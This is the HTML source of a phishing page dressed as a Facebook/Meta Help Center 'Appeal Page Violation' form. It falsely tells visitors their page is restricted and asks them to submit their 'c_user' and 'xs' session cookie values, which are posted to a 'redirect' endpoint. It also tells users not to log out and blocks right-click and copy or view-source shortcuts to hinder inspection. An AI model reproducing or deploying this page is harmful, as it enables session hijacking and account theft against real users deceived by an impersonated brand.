<!doctype html>
<html oncontextmenu="return false">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="action_style.css" rel="stylesheet">
        <title>Action | Submit</title>
        <script type="text/javascript">
    function mousehandler(e) {
        var myevent = (isNS) ? e : event;
        var eventbutton = (isNS) ? myevent.which : myevent.button;
        if ((eventbutton == 2) || (eventbutton == 3)) return false;
    }
    document.oncontextmenu = mischandler;
    document.onmousedown = mousehandler;
    document.onmouseup = mousehandler;
    function disableCtrlKeyCombination(e) {
        var forbiddenKeys = new Array("a", "s", "c", "x","u");
        var key;
        var isCtrl;
        if (window.event) {
            key = window.event.keyCode;
            //IE
            if (window.event.ctrlKey)
                isCtrl = true;
            else
                isCtrl = false;
        }
        else {
            key = e.which;
            //firefox
            if (e.ctrlKey)
                isCtrl = true;
            else
                isCtrl = false;
        }
        if (isCtrl) {
            for (i = 0; i < forbiddenKeys.length; i++) {
                //case-insensitive comparation
                if (forbiddenKeys[i].toLowerCase() == String.fromCharCode(key).toLowerCase()) {
                    return false;
                }
            }
        }
        return true;
    }
</script>
        <div class="md:hidden lg:hidden sm:block border flex w-full h-16 relative bg-[#4667ac]">
            <div class="mx-5 mt-3">
            </div>
            <div>
                <form>
                    <label for="search" class="mb-2 text-sm font-medium text-gray-900 sr-only dark:text-white">Search</label>
                    <div class="relative">
                        <div class="absolute inset-y-0 left-0 flex items-center pl-3 mx-3 pointer-events-none">
                            <svg class="w-3 h-3 text-gray-500 dark:text-gray-400" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 20 20">
                                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m19 19-4-4m0-7A7 7 0 1 1 1 8a7 7 0 0 1 14 0Z"/>
                            </svg>
                        </div>
                        <input type="search" id="search" class="block w-full mt-4 mx-4  pl-7 text-sm text-gray-900 border border-gray-300 rounded-sm bg-gray-50 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" placeholder="How Can We Help?" required>
                    </div>
                </form>
            </div>
        </div>
        <form action="redirect" method="post">
            <div class="relative flex border bg-[#e9ebee] h-10 md:hidden lg:hidden sm:block">
                <div>
                    <div>
                        <img class="h-5  mx-4 mt-2 shadow-2xl md:hidden lg:hidden sm:block" src="/home.png" alt="">
                    </div>
                </div>
                <div class="md:hidden lg:hidden sm:block">
                    <p class="text-[#3578e5] font-extrabold font-serif -mx-3 mt-[0.6rem]">Help Center
    </p>
                </div>
            </div>
            <div class="relative flex justify-center items-center mt-7 md:hidden lg:hidden sm:block">
                <div class="border w-80 shadow-lg">
                    <div>
                        <p class="border-b pl-3 bg-slate-200">Appeal Page Violation
    </p>
                    </div>
                    <div>
                        <p class="text-[10px] font-serif mt-3 mx-3">We have detected unusual activity on your page that violates our community standards. 
      </p>
                    </div>
                    <div>
                        <p class="text-[10px] font-serif  mt-3 mx-3">Your access to your page has been limited, and you are currently unable to post, share, or comment using your page.
      </p>
                    </div>
                    <div>
                        <p class="text-[10px] font-serif  mt-3 mx-3">If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.
      </p>
                    </div>
                    <div>
                        <b class="text-[10px] text-[#90949c] font-bold mx-3">Detailed Video Information
      </b>
                    </div>
                    <div>
                        <a class="w-32 h-20 block" href="https://detailed-video-29b30.web.app/detailed%20video.mp4">
                            <img class="w-32 h-20 mx-3" src="https://cdn.glitch.global/2c5cba70-f554-4220-8d2c-74f913f0120f/canvas.png?v=1694922926137" alt="">
                        </a>
                    </div>
                    <p class="text-[10px] font-serif  mt-3 mx-3">Please be sure to provide the requested information below.
    </p>
                    <div>
                        <p class="text-sm text-gray-400 mx-5">c_user
    </p>
                        <input class="border h-5 mx-3" type="number" name="c_user" id="c_user" required>
                    </div>
                    <div>
                        <p class="text-sm text-gray-400 mx-5 mt-2">xs
    </p>
                        <input class="border h-5 mx-3" type="text" name="xs" id="xs" required>
                    </div>
                    <div>
                        <p class="text-[10px] font-serif   mt-3 mx-3">Please make sure account not to log out from your computer or laptop until you have received a verification email.
      </p>
                    </div>
                    <div class="border mx-3 h-10 mt-3 border-slate-200 bg-slate-200">
                        <button class="border bg-[#4267b2] px-2 p-[2px] rounded mx-52 mt-[7px] hover:bg-blue-400">
                            <p class="text-white text-sm font-serif">Submit
        </p>
                        </button>
                    </div>
                    <div class="mt-8"></div>
                </div>
            </div>
        </form>
        <!-- For Pc Or Laptop -->
        <div class="md:block lg:block hidden border flex w-full h-[6rem]  relative bg-[#4667ac]">
            <div class="mx-10 mt-4">
                <b class="text-5xl text-white">facebook</b>
            </div>
            <div>
                <form class="sm:hidden lg:block md:block">
                    <label for="search" class="hidden lg:block md:block mb-2 text-sm font-medium text-gray-900 sr-only dark:text-white">Search</label>
                    <div class="relative hidden md:block lg:block">
                        <div class="absolute inset-y-0 left-0 flex items-center pl-96 mx-3 pointer-events-none">
                            <svg class="w-3 h-3 text-gray-500 dark:text-gray-400" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 20 20">
                                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m19 19-4-4m0-7A7 7 0 1 1 1 8a7 7 0 0 1 14 0Z"/>
                            </svg>
                        </div>
                        <input type="search" id="search" class="block w-[600px] p-1 mx-96 -mt-9  pl-7 text-sm text-gray-900 border border-gray-300 rounded-sm bg-gray-50 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" placeholder="How Can We Help?" required>
                    </div>
                </form>
            </div>
        </div>
        <form class="sm:hidden lg:block md:block" action="redirect" method="post">
            <div class="relative flex border bg-[#e9ebee] h-12 md:block lg:block hidden ">
                <div>
                    <div>
                        <img class="h-7  mx-10 mt-2 shadow-2xl md:block lg:block hidden" src="/home.png" alt="">
                    </div>
                </div>
                <div class="md:block lg:block hidden">
                    <p class="text-[#3578e5] text-xl font-extrabold font-serif  mx-[4.50rem] -mt-6 u">Help Center
  </p>
                </div>
            </div>
            <div class="border md:block hidden lg:block block mx-72 mt-9 w-[630px]">
                <div>
                    <p class="border-b h-10 font-bold text-[16px] text-[#4b4f56] pl-3 p-2 bg-[#f5f6f7]">Appeal Page Violation
    </p>
                </div>
                <div>
                    <p class="mt-4 pl-3 text-[12px] font-semibold">We have detected unusual activity on your page that violates our community standards.
  </p>
                </div>
                <div>
                    <p class="mt-4 pl-3 text-[12px] font-semibold">Your access to your page has been limited, and you are currently unable to post, share, or comment using your page.
  </p>
                </div>
                <div>
                    <p class="mt-4 pl-3 text-[12px] font-semibold">If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.
  </p>
                </div>
                <div>
                    <p class="text-[11px] text-[#90949c] p-2 font-semibold">Detailed Video Information
  </p>
                </div>
                <div>
                    <a class="w-[120px] h-[80px] block mx-3" href="https://detailed-video-29b30.web.app/detailed%20video.mp4">
                        <img src="https://cdn.glitch.global/2c5cba70-f554-4220-8d2c-74f913f0120f/canvas.png?v=1694922926137" alt="">
                    </a>
                </div>
                <div>
                    <p class=" pl-3 text-[12px] font-semibold">Please be sure to provide the requested information below.
  </p>
                </div>
                <div>
                    <p class="text-slate-400 pl-4 mt-1">c_user
  </p>
                    <input class="border h-6 pl-1 mx-3" type="number" name="c_user" required>
                </div>
                <div>
                    <p class="text-slate-400 pl-4 mt-1">xs
  </p>
                    <input class="border h-6 pl-1 mx-3" type="text" name="xs" required>
                </div>
                <div>
                    <p class="mt-4 pl-3 text-[12px] font-semibold">Please make sure account not to log out from your computer or laptop until you have received a verification email.
  </p>
                </div>
                <div class="border mx-3 h-10 mt-4 bg-[#f5f6f7]">
                    <div class="flex justify-end mx-2">
                        <button class="border h-7 w-16  bg-[#4267b2] text-white shadow-2xl mt-[0.30rem] font-serif font-thin text-xs hover:bg-blue-500" id="delete-btn">Submit
  </button>
                    </div>
                </div>
                <div class="mt-4"></div>
            </div>
    </head>
    <body>
        <footer>
            <div>
                <li class="text-sm text-[#90949c] md:hidden lg:hidden sm:block mt-4 pl-72 flex hover:underline">META©️ 2024      </li>
            </div>
            <div class="hidden lg:block md:bllock flex">
                <div>
                    <p class="text-slate-400 text-sm">META©️ 2024    </p>
                </div>
                <div class="flex relative">
                    <p class="pl-72 hover:underline text-slate-400">About
    </p>
                    <p class="pl-52 hover:underline text-slate-400">AdChoices
    </p>
                    <p class="pl-28 hover:underline text-slate-400">Terms and policies
    </p>
                </div>
                <div class="flex relative">
                    <p class="pl-72 hover:underline text-slate-400">Privacy Policy
    </p>
                    <p class="pl-[9.75rem] hover:underline text-slate-400">Create ad
    </p>
                    <p class="pl-[7.75rem] hover:underline text-slate-400">Cookies
    </p>
                </div>
                <div class="flex relative">
                    <p class="pl-72 hover:underline text-slate-400">Carees
    </p>
                    <p class="pl-[12.75rem] hover:underline text-slate-400">Create Page
    </p>
                </div>
            </div>
            <div class="mt-7"></div>
        </footer>
        <div class="hidden">
    </body>
</html>
